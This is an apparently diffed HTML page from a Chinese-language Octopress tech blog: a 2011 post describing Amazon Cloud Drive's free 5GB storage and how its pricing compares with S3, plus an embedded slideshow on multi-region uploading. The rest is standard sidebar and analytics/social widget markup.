+<div style="width:425px" id="__ss_7543966"> <strong style="display:block;margin:12px 0 4px"><a href="http://www.slideshare.net/hanklin/multi-regionuploading" title="Multi-region uploading">Multi-region uploading</a></strong> <iframe src="http://www.slideshare.net/slideshow/embed_code/7543966" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe> <div style="padding:5px 0 12px"> View more <a href="http://www.slideshare.net/">presentations</a> from <a href="http://www.slideshare.net/hanklin">Hank Lin</a> </div> </div>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/03/30/amazon-cloud-drive">Amazon新功能: Cloud Drive</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-03-30T21:32:48+08:00" pubdate data-updated="true">2011-03-30</time>
+        
+         | <a href="/blog/2011/03/30/amazon-cloud-drive#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>好康又來了</h2>
+
+
+<p>很久沒有寫Amazon的新功能了，趕快來趕上進度一下，這個<a href="https://www.amazon.com/clouddrive">Cloud Drive</a>又是個好康的東西。所有Amazon使用者都有5GB的免費容量! 可以把在Amazon買的音樂直接放在這裡，然後用<a href="http://www.amazon.com/cloudplayer">Cloud Player</a>播放，還有Android、Mac等播放器，不過這個播放功能目前只有美國才能用。所以在台灣的我們，可以把Cloud Drive當成另一個免費的5GB網路空間啦! Cloud Drive後面當然也是使用Amazon自家的S3，不過Cloud Drive有專門作一個Web UI，比較簡單好用。Cloud Drive也可以昇級，有許多付費等級，20GB一年20美金，而且沒有網路傳輸費，比S3還便宜! AWS新的使用者，S3每個月前5GB是免費的，但剩下的15GB算起來是一年25.2美金(以最便宜的美東地區來計算)。但是S3是無限容量的啦，而且S3可以選「地區」(region)，每個物件又可以獨立用API操作，所以彈性還是比較大啦。不過當然還是希望AWS能再降價，過去降好幾次了，應該會再發生!</p>
+
+<p>我一直想著拿著一台iphone或android走在路上搖頭晃腦聽音樂，如果用這個Cloud Drive就很方便啦，不用同步來同步去的。(可惜本人還是使用只能打電話的手機，哈哈!) 看了Amazon，我不禁想到一句：這叫其它廠商怎麼混啊!</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/blog/page/3/">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2013/02/02/octopress-blogging">Octopress blogging</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2012/04/17/jamie%25e6%25b5%2581%25e8%25a1%258c%25e9%258a%25b7-%25e5%25bf%2583%25e5%25be%2597">Jamie流行銷 - 心得</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2012/03/27/memorize">超級記憶王 - 心得</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2012/03/21/paper-hadoop">一切從一篇paper開始 - Hadoop</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2012/03/15/image-optimize-1">網站小圖檔的規範(1)</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <li class="loading">Status updating&#8230;</li>
+  </ul>
+  <script type="text/javascript">
+    $.domReady(function(){
+      getTwitterFeed("hanklin", 4, false);
+    });
+  </script>
+  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
+  
+    <a href="http://twitter.com/hanklin" class="twitter-follow-button" data-show-count="false">Follow @hanklin</a>
+  
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - Hank Lin -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'hanklin';
+      
+        
+        var disqus_script = 'count.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+<!-- start Mixpanel --><script type="text/javascript">(function(e,b){if(!b.__SV){var a,f,i,g;window.mixpanel=b;a=e.createElement("script");a.type="text/javascript";a.async=!0;a.src=("https:"===e.location.protocol?"https:":"http:")+'//cdn.mxpnl.com/libs/mixpanel-2.2.min.js';f=e.getElementsByTagName("script")[0];f.parentNode.insertBefore(a,f);b._i=[];b.init=function(a,e,d){function f(b,h){var a=h.split(".");2==a.length&&(b=b[a[0]],h=a[1]);b[h]=function(){b.push([h].concat(Array.prototype.slice.call(arguments,0)))}}var c=b;"undefined"!==
+typeof d?c=b[d]=[]:d="mixpanel";c.people=c.people||[];c.toString=function(b){var a="mixpanel";"mixpanel"!==d&&(a+="."+d);b||(a+=" (stub)");return a};c.people.toString=function(){return c.toString(1)+".people (stub)"};i="disable track track_pageview track_links track_forms register register_once alias unregister identify name_tag set_config people.set people.increment people.append people.track_charge people.clear_charges people.delete_user".split(" ");for(g=0;g<i.length;g++)f(c,i[g]);b._i.push([a,
+e,d])};b.__SV=1.2}})(document,window.mixpanel||[]);
+mixpanel.init("beb5fb64fa8eb995f72f4c037af8685c");</script><!-- end Mixpanel -->
+
+
+</body>
+</html>
